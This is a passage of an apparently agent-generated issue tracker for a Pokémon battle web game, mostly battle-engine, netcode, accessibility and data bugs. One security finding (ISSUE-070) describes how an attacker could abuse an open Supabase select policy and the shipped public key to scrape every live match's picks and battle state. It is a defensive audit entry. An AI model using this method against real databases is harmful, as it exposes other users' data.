//   battle-focused and the Underground is meant to drive sell decisions
// STORY_MODE_FLOW.md §14 — point A2: "Flat-array PC, cap 10 (revised down
//   from the prior audit's 60 — this is a battle-focused story mode, not
//   a collection roguelike)"
```

**Repro**: Open the Pokémon Center PC tab. The HUD reads "PC X/30". The Underground sell loop is therefore far less compelling than the spec calls for — players can hoard ~3× the intended count before pressure forces a sale.

**Blast radius**: Touches the Underground economy ratio (Safari → sell loop is the explicit spec'd self-balancing money sink). Also touches the "PC nearly full" warning threshold (`box.length >= PC_BOX_CAP - 3 = 27/30`, vs spec's "≥ 8/10"). Also touches the "10/10" PC-full error message at line 40487 (currently shows "30/30" — string is correct but the cap behind it is wrong by spec).

**Fix sketch**: Either (a) drop `PC_BOX_CAP = 10` to match the spec verbatim — players keep their current PC contents, but new deposits past 10 are rejected; or (b) update the spec to ratify the 30-slot implementation, since this likely landed deliberately to accommodate the Pokédex catch-everything achievement plus Safari pulls plus boss-arc keeper. Pick (b) if the cap was raised intentionally and just never propagated to the doc.

**Verification**: After (a), the existing low-slot warning at `>= 27/30` should be retuned to `>= 8/10` for parity. After (b), `STORY_MODE_FLOW.md` §§1/7/14 all need their "10" tokens swapped to "30".

---

## <a id="ISSUE-060"></a> ISSUE-060: Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing

---
id: ISSUE-060
severity: P1
category: inconsistency
anchor_symbol: pendingWager
file: battle.html
agents: [spec-drift-auditor]
fingerprint: b2982543c7b0
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing

**Evidence**:
```
$ grep -niE 'pendingWager|setWager|wagerOpponent|wagerBattle|battleWager|wagerPrompt|wagerOffer|placeWager' battle.html
(no matches)
```
The only `wager` hits in battle.html (lines 36440, 41797, 42065) belong to the **Casino** prize-wall flow, NOT the spec's pre-battle Pokémon-trade wager.

**Repro**: Spec promises ~15% chance on Basic Trainer route battles post-unlock that the trainer offers to wager 1 mon. Win → take their worst; lose → give your best. Never fires in any current Basic Trainer encounter.

**Blast radius**: §8 ordering rule `itinerary → wild → wager prompt → trainer` is unverifiable since wager hook missing. `_compareTeamSlotForWager` (worst/best helpers spec'd in §6) absent; spec's flow-checklist row "Full PC + party → do not show wager if winning transfer has nowhere to go" also unimplemented.

**Fix sketch**: Add `sm.pendingWager` to save schema (migrateStoryPreV20), implement `_rollWagerForRouteBattle(eventIdx)` 15% trigger inside `proceedToNextBattle`, write `_pickFoeWorstSlot` / `_pickPlayerBestSlot` helpers near `rollTrainerTeam` (~32290), and add accept / decline UI in the battle intro flow.

**Verification**: Force `sm.pendingWager = true` via dev seed, fight a Basic Trainer, see wager prompt; on win the foe's worst grade mon transfers to PC.

---

## <a id="ISSUE-061"></a> ISSUE-061: Fire-type damaging moves do not thaw a frozen target (only flag-marked moves thaw)

---
id: ISSUE-061
severity: P1
category: bug
anchor_symbol: performAction
current_line_hint: ~24084
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 69b6c1abe5f6
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Fire-type damaging moves do not thaw a frozen target (only flag-marked moves thaw)

**Evidence**:
```js
const _thawsTargetMoves = new Set(["Scald","Hydro Steam","Steam Eruption","Scorching Sands","Matcha Gotcha","Burning Jealousy"]);
const _movethaws = move.thawsTarget || (move.flags && (move.flags.defrost || move.flags.thawsTarget)) || _thawsTargetMoves.has(move.name);
if (_movethaws && defender.status === "FRZ" && defender.currentHp > 0 && !hitSub) { defender.status = null; ... }
// Flamethrower/Fire Blast/Ember/Fire Punch carry NO defrost flag -> never thaw the target
```

**Repro**: `node scripts/debug/_repro/frz-thaw3.mjs` — Charizard hits a frozen Snorlax with Flamethrower / Fire Blast / Fire Punch / Ember: damage lands but `defender.status` stays "FRZ". Control: Scald (Water + `defrost` flag) correctly thaws. Move-flag dump: `Flamethrower flags={protect,mirror,metronome}` (no defrost); only Flare Blitz/Sacred Fire/Scald carry `defrost`.

**Blast radius**: Every Fire-type attacker vs a frozen target (very common — freeze + Fire coverage). The frozen mon stays locked until its own 20% thaw roll, doubling the effective freeze duration the engine intends. Diverges from Showdown/Gen 2+ where ALL Fire-type damaging moves thaw the target.

**Fix sketch**: Extend the thaw-on-hit condition to also fire when `move.type === "Fire" && move.cat !== "Status"` (in addition to the existing flag/named-move set). Keep the `!hitSub` and `currentHp > 0` guards.

**Verification**: Re-run `frz-thaw3.mjs`; all Fire damaging moves must set `defender.status = null` with a "was thawed out" log. Non-Fire non-flagged moves must NOT thaw.

---

## <a id="ISSUE-062"></a> ISSUE-062: HP-restore berry (Sitrus/Oran) eaten mid-hit suppresses Berserk / Wimp Out / Anger Shell HP-cross

---
id: ISSUE-062
severity: P1
category: bug
anchor_symbol: performAction
current_line_hint: ~24276
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 6c062b4964cb
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: HP-restore berry (Sitrus/Oran) eaten mid-hit suppresses Berserk / Wimp Out / Anger Shell HP-cross

**Evidence**:
```js
actualDamage = Math.min(defender.currentHp, damage); defender.currentHp -= actualDamage;
_checkBerriesAfterDamage(defender);          // <-- Sitrus heals currentHp back up HERE
// ...later...
if (defender.ability === "Berserk" && ... actualDamage > 0) {
    let _bkBefore = defender.currentHp + actualDamage;   // currentHp is post-heal -> over-counts
    if (_bkBefore > _bkHalf && defender.currentHp <= _bkHalf) { ... }  // false after heal
}
```

**Repro**: `node scripts/debug/_repro/berserk-sitrus3.mjs` (sets `state.magicRoom=0` to match production). Berserk Snorlax at 121/235 hit for 10 → 111 (47%). Without a berry: Berserk fires (SpA +1). Holding Sitrus: Sitrus heals to 169 (72%) at `_checkBerriesAfterDamage`, then `currentHp(169) <= half(117.5)` is false → Berserk does NOT fire (SpA stays 0).

**Blast radius**: All HP-threshold reactive triggers that reconstruct pre-hit HP via `currentHp + actualDamage`: Berserk, Anger Shell, Wimp Out, Emergency Exit, Shields Down, Power Construct. Any of those holding Sitrus/Oran/Berry Juice silently lose their effect when the same hit crosses 50%. Common on bulky Berserk/Wimp Out sets.

**Fix sketch**: Capture the post-damage HP before `_checkBerriesAfterDamage` runs (e.g. `const _hpAfterHit = defender.currentHp;`) and have the HP-cross checks compare against `_hpAfterHit` instead of live `currentHp`; or defer `_checkBerriesAfterDamage` until after the HP-cross reactive block (canon order: cross-triggered ability/berry resolve before the heal restores HP).

**Verification**: Re-run `berserk-sitrus3.mjs`; Berserk must fire (SpA 0→1) whether or not Sitrus is held. Add a status/item suite case for Wimp Out + Sitrus crossing 50%.

---

## <a id="ISSUE-063"></a> ISSUE-063: Multi-hit contact moves skip all on-contact abilities/items (Rough Skin, Iron Barbs, Rocky Helmet, Static, etc.)

---
id: ISSUE-063
severity: P1
category: bug
anchor_symbol: performAction
current_line_hint: ~23835
file: battle.html
agents: [battle-engine-debugger]
fingerprint: c57e525b9f15
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Multi-hit contact moves skip all on-contact abilities/items (Rough Skin, Iron Barbs, Rocky Helmet, Static, etc.)

**Evidence**:
```js
if (numHits > 1) {
    // ...apply all hits, animations, Life Orb recoil, parseMoveEffects...
    return;            // <-- returns BEFORE the on-contact block at ~24145
}
// on-contact block (Static/Poison Point/Flame Body/Effect Spore/Rough Skin/Iron Barbs/Rocky Helmet/Gooey/Mummy/Cursed Body/King's Rock flinch) is single-hit-only
```

**Repro**: `node scripts/debug/_repro/multihit-contact.mjs` — Hitmonlee's Double Kick (2-hit contact) vs Iron Barbs Ferrothorn → attacker recoil = 0; vs Rocky Helmet holder → recoil = 0. Control: single-hit Brick Break vs Iron Barbs → recoil = 15 with the "hurt by Iron Barbs" log.

**Blast radius**: Every multi-hit contact move (Double Kick, Dual Wingbeat, Dual Chop, Triple Axel, Triple Kick, Arm Thrust, Tail Slap, Double Hit, Twineedle, Gear Grind, etc.) never triggers contact-recoil abilities (Rough Skin/Iron Barbs), Rocky Helmet, contact-status abilities (Static/Poison Point/Flame Body/Effect Spore/Cute Charm/Poison Touch), Gooey/Tangling Hair speed drop, Mummy, Cursed Body, or King's Rock/Razor Fang flinch. In canon these fire per contact hit. Big AI/eval and playthrough impact.

**Fix sketch**: Refactor the on-contact and on-hit reactive blocks (~24145–24410) into a helper invoked from BOTH the single-hit path and the multi-hit branch (ideally per landed hit for recoil items, once for status-chance abilities), rather than after the single-hit `return`. Guard with `attacker.currentHp > 0` between hits.

**Verification**: Re-run `multihit-contact.mjs`; Double Kick vs Iron Barbs / Rocky Helmet must apply contact recoil. Add property-test coverage that a multi-hit contact move triggers Rough Skin at least once.

---

## <a id="ISSUE-064"></a> ISSUE-064: Multi-hit moves skip the Shield Dust / Sheer Force / Covert Cloak / Substitute secondary gate

---
id: ISSUE-064
severity: P1
category: bug
anchor_symbol: performAction
current_line_hint: ~23826
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 98ab942730c1
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Multi-hit moves skip the Shield Dust / Sheer Force / Covert Cloak / Substitute secondary gate

**Evidence**:
```js
// multi-hit path (numHits > 1) — parseMoveEffects called UNCONDITIONALLY:
await parseMoveEffects(attacker, defender, move, isPlayer); updateUI();
// vs single-hit path (~24690) which DOES gate it:
if (sheerForceActive) { /* skip */ }
else if (move.cat === "Status" || ((defender.ability !== "Shield Dust" && defender.item !== "Covert Cloak") && defender.volatile.sub <= 0)) {
    await parseMoveEffects(attacker, defender, move, isPlayer);
}
```

**Repro**: `node scripts/debug/_repro/secondary-multihit-gate.mjs` — Beedrill (Twineedle, multihit 2, 20% poison) vs Snorlax. With `Math.random` pinned to 0.10: a Shield Dust Snorlax is poisoned (canon: blocked), and a Sheer Force Beedrill still poisons (canon: secondary suppressed). Control (plain) poisons as expected.

**Blast radius**: Twineedle (20% poison) and Double Iron Bash (30% flinch) are the only standard multi-hit moves with chance-based secondaries; both bypass Shield Dust, Covert Cloak, Substitute, and Sheer Force suppression when fired through the `numHits > 1` branch. Twineedle is also in the Sheer Force boost list (~23386), so a Sheer Force user gets the +30% power AND keeps the poison — double-dipping.

**Fix sketch**: Wrap the multi-hit `parseMoveEffects` call (~23826) in the same Sheer Force / Shield Dust / Covert Cloak / sub guard used on the single-hit path at ~24690-24698; ideally factor that gate into one helper both paths call.

**Verification**: Re-run `scripts/debug/_repro/secondary-multihit-gate.mjs`; Shield Dust and Sheer Force cases must show `poisoned=false`. Add a `tests/moves/by-category` case for Twineedle vs Shield Dust.

---

## <a id="ISSUE-065"></a> ISSUE-065: Solar Beam bad-weather power halving is dead code — checks `"SolarBeam"` (no space) which never matches

---
id: ISSUE-065
severity: P1
category: bug
anchor_symbol: performAction
current_line_hint: ~23434
file: battle.html
agents: [battle-engine-debugger]
fingerprint: f2cfc21d6afc
confidence: high
status: fixed-main
---

**Title**: Solar Beam bad-weather power halving is dead code — checks `"SolarBeam"` (no space) which never matches

**Evidence**:
```js
if (move.name === "SolarBeam" && w !== "Sun" && w !== "HarshSun") basePower = Math.floor(basePower * 0.5);
```

**Repro**: `node scripts/debug/_repro/solarbeam-weather.mjs` — Sceptile Solar Beam (Power Herb, max roll, no crit) vs 9999HP Mew: No-weather = 92 dmg, Rain = 92 dmg (identical → NOT halved; canon ≈ half). The move's display name in `movesDB` is `"Solar Beam"` (with a space); `grep -c '"SolarBeam"' battle.html` returns 1 (only this line) vs 3 for `"Solar Beam"`.

**Blast radius**: Solar Beam / Solar Blade deal full power in Rain, Sandstorm, Hail, and Snow instead of 50% — every adverse-weather matchup involving a Solar Beam user is mis-scored (and the AI's `aiEstimateDmg` likewise overrates it). Solar Blade is never checked at all, even with the typo fixed.

**Fix sketch**: Change the string to `"Solar Beam"` and add `"Solar Blade"` (e.g. `(move.name === "Solar Beam" || move.name === "Solar Blade")`). The charge-skip logic at ~21966 already uses the correct spaced names, so only this one branch is wrong.

**Verification**: Re-run `scripts/debug/_repro/solarbeam-weather.mjs`; Rain/Sandstorm damage must be ~50% of no-weather. Cross-check against a damage-formula test pinning weather=Rain.

---

## <a id="ISSUE-066"></a> ISSUE-066: Future Sight / Doom Desire resolve one turn too early (set to 2 turns; spec & Showdown require a 2-turn delay = 3)

---
id: ISSUE-066
severity: P1
category: bug
anchor_symbol: performAction
current_line_hint: ~22648
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 137c06055f1b
confidence: high
status: fixed-claude/pensive-tesla-GbCMy
---

**Title**: Future Sight / Doom Desire resolve one turn too early (set to 2 turns; spec & Showdown require a 2-turn delay = 3)

**Evidence**:
```js
// performAction, Future Sight / Doom Desire handler (~battle.html:22642)
if (move.name === "Future Sight" || move.name === "Doom Desire") {
    ...
    defender.volatile.futureSightTurns = 2;   // <-- off by one; must be 3
    defender.volatile.futureSightDmg = fsDmg;
    ...
}
// runWishHealing (~20866) decrements futureSightTurns once per EoT, strikes at 0:
//   if (mon.volatile.futureSightTurns > 0) { mon.volatile.futureSightTurns--; if (===0 && dmg>0) strike }
```

The counter is SET during the caster's move phase on turn N, then turn N's own end-of-turn (runWishHealing) immediately decrements it 2->1. Turn N+1's EoT decrements 1->0 and fires the strike. Net result: the hit lands at the end of turn N+1 (one turn after the cast), not turn N+2. This is the SAME class as the just-fixed sleep bug (commit a8a923f): a freshly-set counter is ticked the same turn, so the resolution lands one turn early.

This contradicts the project's own spec: `tests/reports/deviations.md` (Future Sight / Doom Desire) states "Damage is delayed 2 turns; first turn shows no HP change." It also contradicts Showdown (Future Sight: "two turns later, the target is attacked" — cast turn 1, strike end of turn 3).

**Repro** (deterministic, jsdom harness, seed 0; gitignored `scripts/debug/_repro/probe5.mjs`):
Player (Alakazam, faster) uses Future Sight on turn 1 vs Snorlax; both Splash thereafter.
```
After turn 1 EoT: FStimer=1  foeHp=400  (no strike)
After turn 2 EoT: FStimer=0  strikeDmg=96   <<< STRUCK at end of turn 2 = 1 turn after cast
```
Identical across two runs at the same seed (deterministic). Expected per spec: no HP change at end of turns 1 AND 2, strike at end of turn 3.

Contrast (proves the intended set value): Wish at `battle.html:26825` is `wishTurns = 2` with the comment "fires at end of NEXT turn" and the harness confirms it heals at end of turn N+1 — correct, because Wish IS a "next turn" effect. Future Sight is a "2 turns later" effect, so its set value must be one higher (3), exactly as Wish:2 :: FutureSight:3.

**Blast radius**: `futureSightTurns` is read/decremented only in `runWishHealing` (~20866) and gated in `performAction` (the "But it failed!" re-cast guard at ~22643) and HUD pills (17634, 18561). Changing the set value to 3 affects the strike turn only; no double-tick exists (verified: the counter is decremented in exactly one site, once per turn, not per-mon). Doom Desire shares this exact handler and is fixed by the same one-line change.

**Fix sketch**: Change `defender.volatile.futureSightTurns = 2;` to `= 3;` at ~22648. (Owner sign-off required — this is a status/mechanic timing change per CLAUDE.md approval rules.) No other code path sets this field.

**Verification**: Re-run `scripts/debug/_repro/probe5.mjs fs`; expect no strike at end of turns 1 and 2, strike at end of turn 3. Optionally fill the `Future Sight` / `Doom Desire` it.todo stubs in `tests/moves/by-category/status.test.js` to assert a 2-turn no-op window then a turn-3 strike.

---

## <a id="ISSUE-067"></a> ISSUE-067: Turn-order priority breakers (Quick Claw, speed-tie, rampage duration) use bare `Math.random()`

---
id: ISSUE-067
severity: P1
category: bug
anchor_symbol: playTurn
current_line_hint: ~19353
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 22f3b567bfd3
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Turn-order priority breakers (Quick Claw, speed-tie, rampage duration) use bare `Math.random()`

**Evidence**:
```js
// battle.html:19353-19354 (Quick Claw 20% proc, both sides)
if (_pItemActiveQC && state.pActive.item === "Quick Claw" && Math.random() < 0.2) { pPri += 0.4; ... }
if (_fItemActiveQC && state.fActive.item === "Quick Claw" && Math.random() < 0.2) { fPri += 0.4; ... }
// battle.html:19368 (speed-tie tiebreak)
else if (fSpe === pSpe) pGoesFirst = Math.random() > 0.5;
// battle.html:19762 (rampage lock duration after Outrage / Petal Dance / Thrash)
attacker.volatile.lockTurns = 1 + Math.floor(Math.random() * 2);
```

Quick Claw + speed tie alone can flip an entire turn's order. Rampage duration affects fatigue confusion timing (fatigue site at 19772 IS gated, but the duration that triggers it isn't).

**Repro**: Two mons with identical Speed, both holding Quick Claw, both with rampage moves. Two replays of the same seed diverge on turn 1.

**Blast radius**: Turn-order tiebreaks influence every subsequent interaction in the turn. Full-team replays cascade out of sync within ~2 turns.

**Fix sketch**: Route all three sites through `const _r = (sm && sm.active) ? storyRngNext : Math.random;`.

**Verification**: `tests/property/priority-order.test.js` should still pass; new test: speed-tie with identical builds + same seed → consistent winner.

---

## <a id="ISSUE-068"></a> ISSUE-068: End-of-turn residual block is not try-wrapped — any throw masks as "Turn skipped" + skips residuals

---
id: ISSUE-068
severity: P1
category: bug
anchor_symbol: playTurn
current_line_hint: ~20127
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 7496103ecc97
confidence: high
status: open
---

**Title**: End-of-turn residual block is not try-wrapped — any throw masks as "Turn skipped" + skips residuals

**Evidence**:
```js
// playTurn inner try; NO per-call guard around these:
runVolatileTimers();
runWishHealing();
endOfTurnEffects(state.pActive, state.fActive); endOfTurnEffects(state.fActive, state.pActive);
tickWeather();
if (state.pActive.dynamaxed) { state.pActive.dynamaxTurns--; ... }   // throws if pActive null
state.residualPhaseComplete = true;          // never reached on throw
// ... only handler is catch(err) at 20154 -> logMsg("Turn skipped") + isLocked=false
```

**Repro**: Static: lines 20127-20151 sit between the inner `try{` (opens ~19990) and `catch(err)` at 20154 with no intervening try. If `endOfTurnEffects`/`tickWeather`/`runWishHealing` throws (e.g. on a mon with cleared `volatile`, or `state.pActive` null after a double-faint edge), control jumps to the catch: poison/burn/weather damage, Speed-Boost tick, Dynamax countdown, and `turnCount++` are all skipped, and the user only sees "[Error: … Turn skipped.]". `state.residualPhaseComplete` stays false, so the NEXT forced-switch may re-run residuals (double-tick). This is the same silent-failure class as the fixed `sm` bug.

**Blast radius**: All EoT effects (status/weather DoT, Leftovers, Wish, Speed Boost, Slow Start, Dynamax countdown). A recurring throw here is invisible except as periodic "Turn skipped".

**Fix sketch**: Wrap each EoT call (or the whole block) in its own try/catch that logs a distinct channel and still sets `residualPhaseComplete = true`, so one failing handler doesn't abort the rest of the turn and doesn't masquerade as a generic turn-skip.

**Verification**: Force `endOfTurnEffects` to throw (e.g. delete `state.pActive.volatile`) and assert subsequent residuals still run and `turnCount` increments.

---

## <a id="ISSUE-069"></a> ISSUE-069: `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase

---
id: ISSUE-069
severity: P1
category: bug
anchor_symbol: pushDataQueue
current_line_hint: ~463
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 28d225daff16
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase

**Evidence**:
```js
// online-pvp.js L463-494
pushData(patch, existingData) {
    const sb = getClient();
    if (!sb || !roomId) return Promise.resolve();
    const op = pushDataQueue.then(() => this._pushDataImpl(patch, existingData));
    pushDataQueue = op.catch((e) => {
        console.warn('[OnlinePvP] pushData queue', e);     // <-- swallows, queue advances
    });
    return op;                                              // caller can await rejection,
                                                            // but no caller actually catches.
},
async _pushDataImpl(patch, existingData) {
    // ...
    const { error: upErr } = await sb.from('pvp_rooms')
        .update({ data, updated_at: new Date().toISOString() }).eq('id', roomId);
    if (upErr) console.warn('[OnlinePvP] pushData update failed', upErr);  // <-- not thrown
},
```

**Repro**: Pull the network on the host mid-battle. `pushData({ battle, ... }, prev)` at L547/L571/L630 await the rejection (or in the upErr case, it returns normally because the `update` error is only console.warned), so callers don't see the failure. The guest never receives the seq bump, the host's local `state` reflects "p1 picked move", and the next turn proceeds locally — desync. Worse: if `_pushDataImpl` throws (e.g., the select at L478 fails), the queue's `.catch()` healing means the *next* `pushData` proceeds as if nothing happened, with no retry of the lost write.

**Blast radius**: All host-authoritative updates: draft progression (L399), draft deadline (L406, L410), p1/p2 pick submission (L547, L571), turn resolution (L630), end-of-round wins (L654), battle start (L716). The serialization is correct (queue preserves order), but the failure-handling contract is broken in two ways: (1) `update` errors at L493 are not thrown, so the queued op resolves "successfully" with bad data, and (2) `select` errors at L481-485 are thrown but only `console.warn`ed by the queue, with no upstream signal — `pushData(...)`'s return value rejects but every callsite uses `await this.pushData(...)` without a `try/catch`, so the rejection bubbles all the way up to the function that called `handlePvPPlayTurn`/`_hostRunResolution`, where it's *also* not caught (those functions don't try-wrap pushData), and ultimately reaches the user's click handler with an unhandled rejection.

**Fix sketch**: (a) Throw on `upErr` at L493 (`if (upErr) throw upErr`) so the queue knows the write actually failed. (b) Add a `pushDataFailed` callback on the OnlineBattle object that signals "we lost sync — UI should show a 'reconnecting' banner". (c) On select/update failure, retry once with exponential backoff before declaring the write lost. (d) Every call site that needs durable confirmation (turn submission, end of round) should `try/catch` the await and surface an inline error to the player ("network hiccup — your move was not sent").

**Verification**: Add a test that injects an `update` error response and asserts: (1) `pushData(patch).then(...).catch(handler)` reaches `handler`, (2) a follow-up `pushData(patch2)` still runs (queue doesn't stall — important), and (3) a `pushDataFailed` event fires with both patches' info.

---

## <a id="ISSUE-070"></a> ISSUE-070: `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state

---
id: ISSUE-070
severity: P1
category: security
anchor_symbol: pvp_rooms_select
current_line_hint: ~31
file: supabase/migrations/001_online_pvp.sql
agents: [pvp-concurrency-hunter]
fingerprint: c6b9e9e968bd
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state

**Evidence**:
```sql
-- supabase/migrations/001_online_pvp.sql L31-35
drop policy if exists "pvp_rooms_select" on public.pvp_rooms;
create policy "pvp_rooms_select"
  on public.pvp_rooms for select
  to anon, authenticated
  using (true);
```

**Repro**: With the publishable key (which is hardcoded in `online-config.js` and shipped to every browser), an attacker runs `client.from('pvp_rooms').select('code, data').range(0, 999)` and gets every live room's code, draft picks (p1/p2 pool, p1/p2 draft), p1_pick/p2_pick (the move each player just selected), and `battle_log_html` (the full battle commentary). Subscribing to `postgres_changes` on `pvp_rooms` gives realtime spectator access to every match without joining.

**Blast radius**: Competitive integrity for ranked-style play (other player can see what you drafted before you commit your pick). Privacy: display names are tied to rooms; an attacker can map "Trainer Alice" to "Trainer Bob" across many matches. Codes are leaked, so anyone watching can join as the second player into a room that hasn't filled yet (though the atomic `try_join_pvp_room` RPC ensures only one guest can actually claim it).

**Fix sketch**: Restrict SELECT to participants. Two approaches: (a) require a token-bearing RPC (`get_room_for_participant(p_room_id, p_token)`) that returns the row only if `p_token` matches `data->>'host_token'` or `data->>'guest_token'`; client-side `select` is denied. (b) Keep SELECT permissive on the `code` column only (so join-by-code works) and gate the `data` column with a column-level grant — but PostgREST + jsonb makes this awkward. (a) is cleaner.

**Verification**: From a non-participant client, `select * from pvp_rooms` must return 0 rows (or only rows where the requesting token matches).

---

## <a id="ISSUE-071"></a> ISSUE-071: `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates

---
id: ISSUE-071
severity: P1
category: bug
anchor_symbol: remoteRowQueue
current_line_hint: ~496
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 564feb239c3e
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates

**Evidence**:
```js
// online-pvp.js L496-508
_onRemoteRow(newRow) {
    if (!newRow) return;
    remoteRowQueue = remoteRowQueue
        .then(async () => {
            const d = newRow.data || {};
            if ((d.seq || 0) <= lastRemoteSeq) return;
            lastRemoteSeq = d.seq || lastRemoteSeq + 1;
            if (typeof global.onOnlineRoomData === 'function') {
                await Promise.resolve(global.onOnlineRoomData(d, { role, roomCode }));
                //          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                //          unbounded — onOnlineRoomData calls startBattle() at L14711,
                //          guestApplyBattleStart() at L14716, guestApplyBattleBlob()
                //          at L14728, consumeRemoteForHost() at L14724 — any UI
                //          promise that never resolves locks the whole channel.
            }
        })
        .catch((e) => console.warn('[OnlinePvP] onOnlineRoomData', e));
},
```

**Repro**: In `guestApplyBattleStart` (L743), the function calls `global.AudioSystem.startNewBattle()` which is wrapped in try/catch — but what about `global.updateUI()` at L768 or `global.applyBattleLogDockClass()` at L773? If any of those `await`s an animation promise or a modal close that depends on user interaction, the queue chain blocks until that promise settles. From that moment on, every future `_onRemoteRow` (every pushData echo, every opponent move) sits in the queue waiting. The realtime subscription is still receiving events, but they pile up behind a stuck `await`. The host has no signal that the guest is stuck. The integration test at `tests/integration/pvp-stub.test.js:75-90` validates serialization but doesn't exercise the hang-recovery path.

**Blast radius**: The whole live-sync layer freezes on a single bad handler invocation. The user sees their input go through (local state changes), but the opponent's responses never appear. Symptom: "the game froze, my opponent's screen says it's their turn but they say it's mine."

**Fix sketch**: Race the handler against a timeout: `await Promise.race([handler, new Promise((_, rej) => setTimeout(() => rej(new Error('onOnlineRoomData timeout')), 30_000))])`. On timeout, log loudly, possibly tear down the channel and reconnect (the `_subscribe` path is idempotent — `removeChannel` then re-create). Alternatively, decouple the queue from the handler: the queue's job is to enforce sequence ordering, not to wait on UI; once the seq check passes, fire-and-forget the handler call with its own error boundary, so a hung handler never blocks subsequent seq updates.

**Verification**: Add a test that mocks `global.onOnlineRoomData = () => new Promise(() => {})` (never resolves), call `_onRemoteRow({ data: { seq: 1 } })`, then `_onRemoteRow({ data: { seq: 2 } })`, then wait 35s. Assert that the queue did *not* block the seq:2 row's handler (or that a reconnect was triggered).

---

## <a id="ISSUE-072"></a> ISSUE-072: Player-facing city actions read "Pokemon League" / "Pokemon Fan Club" (no diacritic)

---
id: ISSUE-072
severity: P1
category: inconsistency
anchor_symbol: renderCityActions
current_line_hint: ~29067
file: battle.html
agents: [consistency-auditor]
fingerprint: 3422a6976f0b
confidence: high
status: open
---

**Title**: Player-facing city actions read "Pokemon League" / "Pokemon Fan Club" (no diacritic)

**Evidence**:
```js
// 29067 — City9 action list (rendered verbatim as a button label)
[59,'City','City9',null,0,['Link Station',/*…*/,'Power Up','Enter Pokemon League']],
// 29101/29106 — Fan Club spliced into every city's action list
if (!Array.isArray(actions) || actions.includes('Pokemon Fan Club')) continue;
actions.splice(insertAt + 1, 0, 'Pokemon Fan Club');
// 38824 / 38984 — same bare labels consumed by the renderer
const hasLeague = actions.includes('Enter Pokemon League');
if (actions.includes('Pokemon Fan Club') && _tutorTeam) { … }
```

**Repro**: Start any story run; the City 9 hub renders an "Enter Pokemon League" button and every city renders a "Pokemon Fan Club" button — both without the é, while the rest of the UI (screen titles "💖 Pokémon Fan Club" @8472, "Pokémon League" blurb @30950, arrival lines) uses "Pokémon". The two strings are the only *player-visible* bare-"Pokemon" occurrences; the other ~20 hits in the file are all CSS/JS comments.

**Blast radius**: Two of the most-clicked buttons in the game. The mismatch is visible side-by-side with correctly-accented labels on the same hub screen. Low code risk, high polish cost.

**Fix sketch**: Change the two literals to "Enter Pokémon League" and "Pokémon Fan Club", then update the matching `.includes('Pokemon Fan Club')` / `.includes('Enter Pokemon League')` dispatch checks (29101, 38824, 38947-38993) in lockstep — these are string-equality dispatches, so label and check must change together.

**Verification**: `grep -nE "'(Pokemon Fan Club|Enter Pokemon League)'" battle.html` returns 0; both buttons still open their screens (Fan Club splice + League gate still match).

---

## <a id="ISSUE-073"></a> ISSUE-073: Draft pick cards are click-only <div>s — keyboard/SR users cannot select a Pokémon

---
id: ISSUE-073
severity: P1
category: a11y
anchor_symbol: renderDraft
current_line_hint: ~15848
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 27b0bb57fb3a
confidence: high
status: open
---

**Title**: Draft pick cards are click-only <div>s — keyboard/SR users cannot select a Pokémon

**Evidence**:
```js
let btn = document.createElement('div'); btn.className = `draft-card tier-${tier}`;
// ...no tabindex, no role, no keydown added...
btn.onclick = () => { btn.onclick = null; selectDraft(draftItem); }; grid.appendChild(btn);
```

**Repro**: Open Draft screen (PvP / gauntlet). Tab through the grid — the cards never receive focus; Enter/Space do nothing. Only the inner info `<button>` is reachable. Drafting is impossible without a mouse/touch.

**Blast radius**: REDESIGN_PLAN §6 explicitly reuses this exact pipeline (`renderDraft`) for the new Fight Club 5-round gauntlet draft — the operability blocker propagates into the new screen unless fixed here.

**Fix sketch**: Build the card as `<button type="button">` (or add `role="button" tabindex="0"` + a keydown handler firing on Enter/Space). Keep the inner info button as a real nested control or move it out to avoid nested interactive elements.

**Verification**: Tab reaches each card, focus ring shows (global :focus-visible at L54 already covers it), Enter selects. Re-test in the new Fight Club draft.

---

## <a id="ISSUE-074"></a> ISSUE-074: `No Item` sentinel string used in 11 build slots is absent from `data/items.json`

---
id: ISSUE-074
severity: P1
category: data
anchor_symbol: resolveCsvBuildEntry
file: data/builds/gen8.json
agents: [data-integrity-auditor]
fingerprint: 5359999bcf35
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `No Item` sentinel string used in 11 build slots is absent from `data/items.json`

**Evidence**:
```json
"Vileplume": { "nu": { "Defensive": {"item": ["Black Sludge", "No Item"], ...} } }
"Ninjask":   { "pu": { "Swords Dance": {"item": ["Heavy-Duty Boots", "No Item"], ...} } }
